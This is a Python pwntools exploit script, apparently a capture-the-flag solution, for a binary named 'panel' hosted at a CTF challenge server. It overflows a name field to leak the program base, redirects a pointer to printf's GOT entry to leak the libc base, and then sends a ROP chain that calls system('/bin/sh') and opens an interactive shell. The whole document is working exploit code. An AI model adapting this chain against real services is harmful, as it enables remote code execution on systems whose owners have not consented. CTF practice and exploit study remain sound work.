#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './panel'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.airoverflow.com', 34088

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *set_name+129
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    payload = b'a' * (54) + b'bb'
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'name:', payload)

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'3')

    io.recvuntil(b'bb')
    elf.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2008

    payload = b'a' * (54) + b'bb' + p64(elf.got['printf'])
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'name:', payload)

    io.sendlineafter(b'>', b'3')
    io.recvuntil(b'Role: ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['printf']

    offset = 72
    payload = flat({
        offset: [
            libc.address + 0x02a3e5, # pop rdi; ret
            next(libc.search(b'/bin/sh\x00')),
            elf.address + 0x0101a, # ret
            libc.sym['system'],
        ]
    })
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'name:', payload)

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()